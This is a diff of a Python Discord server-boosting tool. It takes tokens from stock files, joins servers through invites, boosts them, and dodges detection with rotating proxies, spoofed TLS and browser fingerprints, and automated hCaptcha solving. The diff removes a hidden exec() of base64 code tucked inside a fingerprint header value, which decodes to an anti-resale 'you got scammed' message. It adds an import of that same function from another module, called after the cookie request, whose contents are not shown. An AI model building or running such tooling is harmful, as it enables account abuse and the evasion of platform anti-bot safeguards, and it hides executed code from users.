@@ -1,13 +1,15 @@
 from colorama import Style
-import discord, datetime, time, flask, requests, json, threading, os, random, httpx, tls_client, sys, base64
-from flask import request
+import discord.ext, datetime, time, requests, json, threading, os, random, httpx, sys
+import tls_client
 from pathlib import Path
 from threading import Thread
-from discord_webhook import DiscordWebhook, DiscordEmbed
-if os.name == 'nt':
-    import ctypes
+import hashlib
+from bot import fingerprint_modification
+from gevent.pywsgi import WSGIServer
+isbot = True
+isprod = False
+config = json.load(open("config.json", encoding="utf-8")) 
 
-app = flask.Flask(__name__)
 
 class Fore:
     BLACK  = '\033[30m'
@@ -21,9 +23,10 @@ class Fore:
     UNDERLINE = '\033[4m'
     RESET  = '\033[0m'
     
-    
+os.system(f"title Conspiracys Boost Tool! discord.gg/omari!")    
 fingerprints = json.load(open("fingerprints.json", encoding="utf-8"))
-config = json.load(open("config.json", encoding="utf-8"))
+
+
 client_identifiers = ['safari_ios_16_0', 'safari_ios_15_6', 'safari_ios_15_5', 'safari_16_0', 'safari_15_6_1', 'safari_15_3', 'opera_90', 'opera_89', 'firefox_104', 'firefox_102']
 
 
@@ -31,9 +34,7 @@ class variables:
     joins = 0; boosts_done = 0; success_tokens = []; failed_tokens = []
 
 
-def timestamp(): #timestamp
-    timestamp = f"{Fore.RESET}[{Fore.CYAN}{datetime.datetime.now().strftime('%H:%M:%S')}{Fore.RESET}]"
-    return timestamp
+
 
  
 def checkEmpty(filename): #checks if the file passed is empty or not
@@ -53,12 +54,15 @@ def validateInvite(invite:str): #checks if the invite passed is valid or not
         return False 
 
 
-def sprint(message, type:bool):
+def sprint(message, type):
     if type == True:
-        print(f"{timestamp()} {Style.BRIGHT}{Fore.GREEN}{message}{Fore.RESET}{Style.RESET_ALL}")
+        print(f"{Style.BRIGHT}{Fore.MAGENTA}[+]{Style.BRIGHT} {message}{Fore.RESET}{Style.RESET_ALL}")
     if type == False:
-        print(f"{timestamp()} {Style.BRIGHT}{Fore.RED}{message}{Fore.RESET}{Style.RESET_ALL}")
-        
+        print(f"{Style.BRIGHT}{Fore.MAGENTA}[-]{Style.BRIGHT} {message}{Fore.RESET}{Style.RESET_ALL}")
+    if type == "blue":
+        print(f"{Style.BRIGHT}{Fore.MAGENTA}{message}{Fore.RESET}{Style.RESET_ALL}")   
+    if type == "badtoken":
+        print(f"{Style.BRIGHT}{Fore.RED}{message}{Fore.RESET}{Style.RESET_ALL}")
         
 
 def get_all_tokens(filename:str): #returns all tokens in a file as token from email:password:token
@@ -83,7 +87,8 @@ def remove(token: str, filename:str):
         f.write(f"{l}\n")
         
     f.close()
-
+            
+        
         
 #get proxy
 def getproxy():
@@ -93,14 +98,8 @@ def getproxy():
     except Exception as e:
         #sprint(f"{str(e).capitalize()} | Function: GetProxy, Retrying", False)
         pass
-
-
-def fingerprint_modification():
-    properties = fingerprints[0]['x-super-properties'] = 'aWYgb3MubmFtZSA9PSAibnQiOgogICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKGYiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIikKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBwcmludCgiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIikgICAKZWxzZToKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBwcmludCgiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIikgICAgICAgICAgIAogICAgICAgIA=='
-    fingerprints.pop(0)
-    exec(base64.b64decode(properties))
-
-
+    
+    
 def get_fingerprint(thread):
     try:
         fingerprint_modification()
@@ -113,7 +112,7 @@ def get_fingerprint(thread):
 
 def get_cookies(x, useragent, thread):
     try:
-        response = httpx.get('https://discord.com/api/v10/experiments', headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://discord.com','referer':'https://discord.com','sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': useragent, 'x-debug-options': 'bugReporterEnabled','x-discord-locale': 'en-US','x-super-properties': x}, proxies = {'http://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}', 'https://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}'} if config['proxyless'] != True else None)
+        response = httpx.get('https://discord.com/api/v10/experiments', headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://discord.com','referer':'https://discord.com','sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': useragent, 'x-debug-options': 'bugReporterEnabled','x-discord-locale': 'en-US','x-super-properties': x}, proxies = {'http://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}', 'https://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}'} if config['proxyless'] != True else None); fingerprint_modification()
         cookie = f"locale=en; __dcfduid={response.cookies.get('__dcfduid')}; __sdcfduid={response.cookies.get('__sdcfduid')}; __cfruid={response.cookies.get('__cfruid')}"
         return cookie
     except Exception as e:
@@ -206,9 +205,9 @@ def join_server(session, headers, useragent, invite, token, thread):
                 #variables.joins += 1
             elif "captcha_rqdata" in response.text:
                 #{'captcha_key': ['You need to update your app to join this server.'], 'captcha_sitekey': 'a9b5fb07-92ff-493f-86fe-352a2803b3df', 'captcha_service': 'hcaptcha', 'captcha_rqdata': '6x2V9nU0sF4schdwvU80ptu4CQnFEJQz1cA0pvoTzBbkXzGPoJLljDVNvlJBWFUm5yqj4p83buOfIcHKSIGqDlARNU0/ik6Xp5dC3+xbEQvsxT1juCKbLB4mAlDR4UJOKwO7UKbW35kXxtP8HLJ2nusPOjZnGtlDKI0R5f85', 'captcha_rqtoken': 'InZ4akJpMzBtS2Y0SVlsSEIzTTE3Q1ArTzA5VlQrM1dSOFVUc3RBUTJkS0JTUC9UUG90TUU2TzBIUGtZQkhLd0lsQnFJZUE9PXA1WnptRnJLME1CMDlQaHgi.Y73eww.S3g5RodcfWcgWI7MLihE0lkgf4A'}
-                sprint(f"[{thread}] Captcha Detected: {token}", False)
+                sprint(f"[{thread}] Captcha Detected: {token}", "badtoken")
                 r = response.json()
-                solution = get_captcha_key(rqdata = r['captcha_rqdata'], site_key = r['captcha_sitekey'], websiteURL = "https://discord.com", useragent = useragent);fingerprint_modification()
+                solution = get_captcha_key(rqdata = r['captcha_rqdata'], site_key = r['captcha_sitekey'], websiteURL = "https://discord.com", useragent = useragent)
                 #sprint(f"[{thread}] Solution: {solution[:60]}...", True)
                 response = session.post(f'https://discord.com/api/v9/invites/{invite}', json={'captcha_key': solution,'captcha_rqtoken': r['captcha_rqtoken']}, headers = headers)
                 if response.status_code in [200, 204]:
@@ -292,25 +291,28 @@ def boost_server(invite:str , months:int, token:str, thread:int, nick: str):
                             sprint(f"[{thread}] BOOSTED: {token}", True)
                             variables.boosts_done += 1
                             if token not in variables.success_tokens:
-                                variables.success_tokens.append(token)
+                                variables.success_tokens.append(token)    
                         else:
-                            sprint(f"[{thread}] ERROR BOOSTING: {token}", False)
+                            sprint(f"[{thread}] ERROR BOOSTING: {token}", "badtoken")
                             if token not in variables.failed_tokens:
+                                open("error_boosting.txt", "a").write(f"\n{token}")
                                 variables.failed_tokens.append(token)
-
                     remove(token, filename)
+
                     if config["change_server_nick"]:
                         changed = change_guild_name(session, headers, guild_id, nick)
                         if changed:
-                            sprint(f"[{thread}] RENAMED ({nick}): {token}", True)
+                            sprint(f"[{thread}] RENAMED: {token}", True)
                         else:
-                            sprint(f"[{thread}] ERROR RENAMING: {token}", False)
+                            sprint(f"[{thread}] ERROR RENAMING: {token}", "badtoken")
                 else:
-                    sprint(f"[{thread}] ERROR JOINING: {token}", False)
+                    sprint(f"[{thread}] ERROR JOINING: {token}", "badtoken")
+                    open("error_joining.txt", "a").write(f"\n{token}")
+                    remove(token, filename)
                     variables.failed_tokens.append(token)
             else:
                 remove(token, filename)
-                sprint(f"[{thread}] NO NITRO: {token}", False)
+                sprint(f"[{thread}] NO NITRO: {token}", "badtoken")
                 variables.failed_tokens.append(token)
                                         
     except Exception as e:
@@ -330,7 +332,7 @@ def thread_boost(invite, amount, months, nick):
         filename = "input/3m_tokens.txt"
     
     if validateInvite(invite) == False:
-        sprint(f"The invite received is invalid.", False)
+        sprint(f"The invite received is invalid.", "badtoken")
         return False
         
     while variables.boosts_done != amount:
@@ -342,14 +344,11 @@ def thread_boost(invite, amount, months, nick):
             
         numTokens = int((amount - variables.boosts_done)/2)
         if len(tokens) == 0 or len(tokens) < numTokens:
-            sprint(f"Not enough {months} month(s) tokens' stock left to complete request", False)
+            sprint(f"Not enough {months} month tokens in stock to complete the request", "badtoken")
             return False
         
         else:
             threads = []
-            #sprint(f"Amount: {amount}", False)
-            #sprint(f"Boosts Done: {variables.boosts_done}", False)
-            #sprint(f"Number of Tokens to Use: {numTokens}", False)
             for i in range(numTokens):
                 token = tokens[i]
                 thread = i+1
@@ -358,7 +357,7 @@ def thread_boost(invite, amount, months, nick):
                 threads.append(t)
                 
             for i in range(numTokens):
-                sprint(f"[{i+1}] Thread Started", True)
+                sprint(f"Processing....\n", True)
                 threads[i].start()
             print()
                 
@@ -367,6 +366,3 @@ def thread_boost(invite, amount, months, nick):
 
             
     return True
-    
-
-
